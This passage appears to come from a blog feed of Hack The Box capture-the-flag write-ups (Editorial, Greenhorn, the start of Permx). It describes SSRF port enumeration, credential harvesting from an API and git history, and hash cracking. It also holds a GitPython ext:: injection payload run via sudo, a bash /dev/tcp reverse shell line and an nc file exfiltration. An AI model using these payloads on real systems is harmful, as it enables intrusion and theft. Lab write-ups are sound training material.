+<p>Changing our URL value to <code>http://127.0.0.1:FUZZ</code> and copying our request to a file named 127.0.0.1.req in burpwill allow us to enumerate any other listening ports:</p>
+<p>Which we can then run FFUF against, excluding the unsplash from our successful results (as they all return 200s)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -request 127.0.0.1.req -request-proto http -w /opt/SecLists/Discovery/Infrastructure/common-http-ports.txt -fr unsplash      
+</span></span></code></pre></div><p>We can check to see what uri is included in the response and use curl to get the contents of the page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl $URL/static/uploads/42f3802b-f94d-4148-afd7-5215529a8ada | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;messages&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;promotions&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve a list of all the promotions in our library.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/promos&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;coupons&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the list of coupons to use in our library.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;new_authors&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the welcome message sended to our new authors.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/authors&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;platform_use&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve examples of how to use the platform.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;version&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;changelog&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve a list of all the versions and updates of the api.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/changelog&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;latest&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the last version of api.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Next we can check out the endpoints:</p>
+<p>http://127.0.0.1:5000/api/latest/metadata/messages/authors has creds</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;template_mail_message&#34;</span>:<span style="color:#e6db74">&#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&#34;</span>}
+</span></span></code></pre></div><p><code>dev:dev080217_devAPI!@</code> which allows us to login via ssh</p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>Foothold is found during enumeration of the web application on port 80. We find we are able to perform SSRFs and enumerate another web server on port 5000 on localhost of the box. We can then enumerate different api endpoints until we find plaintext creds allowing us to login via ssh as <code>dev</code>.</p>
+<h2 id="exploits">Exploits</h2>
+<hr>
+<h1 id="privesc">PrivEsc</h1>
+<p>Interestingly we find a .git directory with a potential user <code>dev-carlos.valderrama</code></p>
+<p>Checking passwd, that user doesn&rsquo;t appear to be local</p>
+<p>We can check the different commits for any sensitive info:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps/.git$ git log
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dev@editorial:~/apps/.git$ git show 1e84a036b2f33c59e2390730699a488c65643d28
+</span></span></code></pre></div><p>One pops out as it mentions <code>internal</code> info</p>
+<p><code>prod:080217_Producti0n_2023!@</code></p>
+<p>Nice!</p>
+<p>We can switch users to prod and we find we can run sudo</p>
+<p>Checking out the script;</p>
+<p>No luck trying to escape commands, but we can look at the packages the script imports and check their versions:</p>
+<p>We see it&rsquo;s using <code>GitPython 3.1.29</code>, and there&rsquo;s an exploit for it</p>
+<p>POC to test for code execution:</p>
+<pre tabindex="0"><code># `&#39;ext::sh -c touch% /tmp/pwned&#39;`
+</code></pre><p>When we run the command we see a new file in /tmp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#e6db74">&#39;ext::sh -c touch% /tmp/pwned&#39;</span>
+</span></span></code></pre></div><p>We can copy the root flag to the temp directory to read it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#e6db74">&#39;ext::sh -c cat% /root/root.txt% &gt;% /tmp/pwned&#39;</span>
+</span></span></code></pre></div><h2 id="exploits-1">Exploits</h2>
+<p><a href="https://github.com/gitpython-developers/GitPython/issues/1515">https://github.com/gitpython-developers/GitPython/issues/1515</a></p>
+<hr>
+<h1 id="postpivot">Post/Pivot</h1>
+<p>We can also easily get a rev shell as root if we wanted to loot the box further:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:/opt/internal_apps/clone_changes$ echo <span style="color:#e6db74">&#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.7/9001 0&gt;&amp;1&#39;</span> &gt;&gt; /tmp/rev.sh
+</span></span></code></pre></div><hr>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Greenhorn</title>
+            <link>http://localhost:1313/posts/greenhorn/</link>
+            <pubDate>Sat, 24 Aug 2024 16:50:47 -0400</pubDate>
+            
+            <guid>http://localhost:1313/posts/greenhorn/</guid>
+            <description>HTB - Linux - Easy</description>
+            <content type="html"><![CDATA[<h1 id="enum">Enum</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://greenhorn.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines, Help, RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Request
+</span></span></code></pre></div><h2 id="80-nginx-1180">80/ nginx 1.18.0</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>80/tcp   open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://greenhorn.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/login.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1242<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://greenhorn.htb/images/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/admin.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4026<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/install.php          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4035<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/files                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://greenhorn.htb/files/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/data                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://greenhorn.htb/data/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/docs                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://greenhorn.htb/docs/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/requirements.php     <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4047<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We find a hostname to add to our /etc/hosts <code>greenhorn.htb</code>. Checked for vhosts and didn&rsquo;t find any.</p>
+<p>Powered by pluck</p>
+<p><code>login.php</code> file gives us a version <code>pluck 4.7.18</code></p>
+<p>Checking searchsploit shows a potential exploit</p>
+<p>We need to be authenticated to run it.</p>
+<h2 id="3000http">3000/http</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /user/login<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/v2                   <span style="color:#f92672">(</span>Status: 401<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 50<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/issues               <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /user/login<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/explore              <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 41<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /explore/repos<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/notifications        <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /user/login<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/milestones           <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /user/login<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>No vhosts found.</p>
+<p>Found a version on the <code>/admin</code> page</p>
+<p><code>[Powered by Gitea](https://about.gitea.com) Version: 1.21.11</code></p>
+<p>This looks to be a pretty recent version</p>
+<p>Since we know we need a password to login as admin to the pluck app on port 80, we can check the gitea site and see if we can find any creds within the repo or within past commits.</p>
+<p>Start by cloning the repo locally:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ git clone http://greenhorn.htb:3000/GreenAdmin/GreenHorn.git
+</span></span></code></pre></div><p>Nothing interesting there, just the one commit for the repo. Looking at documentation for pluck, we see it doesn&rsquo;t use a database but stores everything in files. Did the new dev upload that file as well? yep</p>
+<p>We can crack the hash with hashcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn/GreenHorn/files<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -m <span style="color:#ae81ff">1700</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
+</span></span></code></pre></div><p><code>admin:iloveyou1</code> allows us to login and now we can try the rce exploit (CVE-2023-50564).</p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>Created a python script to exploit this in one shot &raquo; <a href="https://raw.githubusercontent.com/thefizzyfish/CVE-2023-50564-pluck/main/CVE-2023-50564.py">https://raw.githubusercontent.com/thefizzyfish/CVE-2023-50564-pluck/main/CVE-2023-50564.py</a></p>
+<p>We can list what&rsquo;s in <code>junior</code>&rsquo;s home dir but can&rsquo;t read the flag</p>
+<h2 id="exploits">Exploits</h2>
+<p>CVE-2023-50564
+<a href="https://github.com/thefizzyfish/CVE-2023-50564-pluck">https://github.com/thefizzyfish/CVE-2023-50564-pluck</a></p>
+<hr>
+<h1 id="privesc">PrivEsc</h1>
+<p>We can&rsquo;t ssh into the box as junior with the <code>iloveyou1</code> password as it requires public keys.</p>
+<p>We can switch to junior with <code>su</code></p>
+<p>Interesting linpeas output:</p>
+<p>We could try replacing the gitea executable with a rev shell to pivot to the gitea user?
+That might be rabbit hole as the file is busy whenever I try to replace it</p>
+<p>Looking back at <code>junior</code>&rsquo;s home directory finds an interesting pdf we can send to our box to take a look at</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On remote host</span>
+</span></span><span style="display:flex;"><span>junior@greenhorn:~$ ls
+</span></span><span style="display:flex;"><span> user.txt  <span style="color:#e6db74">&#39;Using OpenVAS.pdf&#39;</span>
+</span></span><span style="display:flex;"><span>junior@greenhorn:~$ cat <span style="color:#e6db74">&#39;Using OpenVAS.pdf&#39;</span> | nc 10.10.14.7 <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>junior@greenhorn:~$ 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># On local host</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -l -p <span style="color:#ae81ff">1234</span> -q <span style="color:#ae81ff">1</span> &gt; <span style="color:#e6db74">&#39;Using OpenVAS.pdf&#39;</span> &lt; /dev/null
+</span></span></code></pre></div><p>Interesting but checking the file system for openvas doesn&rsquo;t turn anything up. We can try to depixilate the password with a tool named <code>depix</code> &raquo; <a href="https://github.com/spipm/Depix">https://github.com/spipm/Depix</a></p>
+<p>First extract the image from the pdf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ pdfimages <span style="color:#e6db74">&#34;./Using OpenVAS.pdf&#34;</span> greenhorn
+</span></span></code></pre></div><p>Run the tool against the created image:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 Depix/depix.py -p greenhorn-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>2024-08-24 16:20:06,891 - Saving output image to: output.png
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>root:sidefromsidetheothersidesidefromsidetheotherside
+</span></span></code></pre></div><p>And that&rsquo;s all folks</p>
+<h2 id="exploits-1">Exploits</h2>
+<hr>
+<h1 id="postpivot">Post/Pivot</h1>
+<hr>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Permx</title>
+            <link>http://localhost:1313/posts/permx/</link>
+            <pubDate>Sat, 24 Aug 2024 16:50:47 -0400</pubDate>
+            
+            <guid>http://localhost:1313/posts/permx/</guid>
+            <description>HTB - Linux - Easy</description>
+            <content type="html"><![CDATA[<h1 id="enum">Enum</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://permx.htb
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h1 id="80permxhtb">80/permx.htb</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://permx.htb
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Nmap picks up a hostname we need to add to our hosts file <code>permx.htb</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ whatweb permx.htb     
+</span></span><span style="display:flex;"><span>http://permx.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.52<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>permx@htb.com<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.23<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>3.4.1<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>eLEARNING<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Next up is directory enum and vhost enum</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ffuf vhost discovery filtering out status codes 302</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u $URL -H <span style="color:#e6db74">&#39;Host: FUZZ.permx.htb&#39;</span> -fc <span style="color:#ae81ff">302</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>www                     <span style="color:#f92672">[</span>Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 37ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>lms                     <span style="color:#f92672">[</span>Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 71ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Vhost discovery gets us two, <code>www</code> and <code>lms</code>. Nothing interesting from the initial dir enumeration of permx.htb. Maybe one of the vhosts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t <span style="color:#ae81ff">50</span> -x php --exclude-length <span style="color:#ae81ff">274</span> 
